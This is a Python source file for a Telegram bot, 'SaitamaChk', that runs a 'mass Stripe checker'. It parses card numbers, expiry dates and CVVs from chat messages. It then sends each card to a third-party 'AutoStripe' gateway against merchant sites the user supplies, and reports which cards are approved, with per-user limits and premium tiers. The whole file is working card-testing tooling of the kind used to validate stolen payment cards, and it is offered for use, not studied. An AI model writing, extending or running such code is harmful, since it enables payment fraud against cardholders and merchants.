# mst.py - Mass Stripe Checker para SaitamaChk (FULL FIXED + REPLY)

import re
import time
import asyncio
import aiohttp
import logging

import db
from antispam import antispam_guard
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler, MessageHandler, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("mst")

BOT_TAG = '<a href="http://t.me/SaitamaChecker_Bot">[拳]</a>'

# ==============================
# CONFIG
# ==============================

STRIPE_API_BASE = "https://md-auto-stripe.onrender.com/gateway=AutoStripe/key=md-tech"
REQUEST_TIMEOUT = 90
CONNECT_TIMEOUT = 15

MAX_CCS = 20
DELAY = 0.35

CC_REGEX = r'(\d{14,16})[:,;/|•\s]+(\d{1,2})[:,;/|•\s]+(\d{2,4})[:,;/|•\s]+(\d{3,4})'

# ==============================
# CONCURRENCIA
# ==============================

busy_users = {}

def get_limit(uid: int) -> int:
    if db.is_owner(uid) or db.is_admin(uid) or db.is_premium(uid):
        return 4
    return 2

def can_run(uid: int) -> bool:
    return busy_users.get(uid, 0) < get_limit(uid)

def mark_start(uid: int):
    busy_users[uid] = busy_users.get(uid, 0) + 1

def mark_end(uid: int):
    if uid in busy_users:
        busy_users[uid] -= 1
        if busy_users[uid] <= 0:
            del busy_users[uid]

# ==============================
# HELPERS
# ==============================

def extract_cards(text: str):
    matches = re.findall(CC_REGEX, text)
    cards = []

    for n, mm, yy, cvv in matches[:MAX_CCS]:
        mm = mm.zfill(2)
        yy = yy[-2:]
        cards.append(f"{n}|{mm}|20{yy}|{cvv}")

    return cards

def format_status(status: str) -> str:
    s = status.lower()
    if "approved" in s:
        return "Approved ✅"
    if "declined" in s:
        return "Declined ❌"
    return "Error ⚠️"

def clean_site(site: str) -> str:
    return site.replace("https://", "").replace("http://", "").replace("www.", "")

# ==============================
# API CALL (SAFE JSON)
# ==============================

async def check_stripe(cc: str, site: str):
    site_clean = clean_site(site)
    url = f"{STRIPE_API_BASE}/site={site_clean}/cc={cc}"

    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECT_TIMEOUT
    )

    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw_text = await resp.text()

                try:
                    data = await resp.json()
                except Exception:
                    logger.error(f"API NO JSON: {raw_text}")
                    return "Error", raw_text[:300]

                return (
                    data.get("Status", "Error"),
                    data.get("Response", "N/A")
                )

    except asyncio.TimeoutError:
        return "Error", "TIMEOUT"
    except Exception as e:
        return "Error", str(e)[:80]

# ==============================
# FORMATO BLOQUE
# ==============================

def format_block(cc, status, response, site_number):
    return (
        f"<b>CC:</b> <code>{cc}</code>\n"
        f"<b>Status:</b> <code>{format_status(status)}</code>\n"
        f"<b>Response:</b> <code>{response}</code>\n"
        f"<b>Site:</b> {site_number}\n"
        "━━━━━━━━━━━━━━━━\n"
    )

# ==============================
# /MST COMMAND
# ==============================

async def handle_mst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = update.effective_user.username or update.effective_user.first_name
    msg = update.message

    if not await antispam_guard(update, context):
        return

    if not can_run(uid):
        await msg.reply_text(
            "⏳ Límite de ejecuciones alcanzado.",
            reply_to_message_id=msg.message_id
        )
        return

    if not db.get_user(uid):
        await msg.reply_text(
            "❌ Debes registrarte primero.",
            reply_to_message_id=msg.message_id
        )
        return

    text = msg.text or ""
    raw = ""

    if text.startswith("."):
        raw = " ".join(text.split()[1:])
    else:
        raw = " ".join(context.args)

    if not raw and msg.reply_to_message:
        raw = msg.reply_to_message.text or ""

    if not raw.strip():
        await msg.reply_text(
            "⚠️ Uso: <code>/mst lista_de_ccs</code>",
            parse_mode="HTML",
            reply_to_message_id=msg.message_id
        )
        return

    cards = extract_cards(raw)
    if not cards:
        await msg.reply_text(
            "❌ No se detectaron CCs válidas.",
            reply_to_message_id=msg.message_id
        )
        return

    sites = db.get_user_stripe_sites(uid)
    if not sites:
        await msg.reply_text(
            "❌ No tienes sitios Stripe.",
            reply_to_message_id=msg.message_id
        )
        return

    mark_start(uid)

    processing = await msg.reply_text(
        "🔄 Checking Stripe...",
        reply_to_message_id=msg.message_id
    )

    start = time.time()
    blocks = []

    try:
        cc_idx = 0

        for cc in cards:
            cc_idx += 1
            site_index = (cc_idx - 1) % len(sites)
            site = sites[site_index]

            status, response = await check_stripe(cc, site)

            blocks.append(
                format_block(cc, status, response, site_index + 1)
            )

            await asyncio.sleep(DELAY)

        elapsed = time.time() - start

        final = (
            f"{BOT_TAG} <b>Mass Stripe</b>\n"
            "━━━━━━━━━━━━━━━━\n"
            + "".join(blocks)
            + f"{BOT_TAG} <b>Total:</b> {len(cards)} | <b>Time:</b> {elapsed:.2f}s\n"
            f"{BOT_TAG} <b>Req by:</b> @{user}"
        )

        await processing.edit_text(
            final,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    finally:
        mark_end(uid)

# ==============================
# DOT
# ==============================

async def handle_dot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text.startswith(".mst"):
        await handle_mst(update, context)

# ==============================
# REGISTER
# ==============================

def register_handlers(app):
    app.add_handler(CommandHandler("mst", handle_mst))
    app.add_handler(MessageHandler(filters.Regex(r"^\.mst\b"), handle_dot))
    logger.info("Mass Stripe Checker cargado correctamente")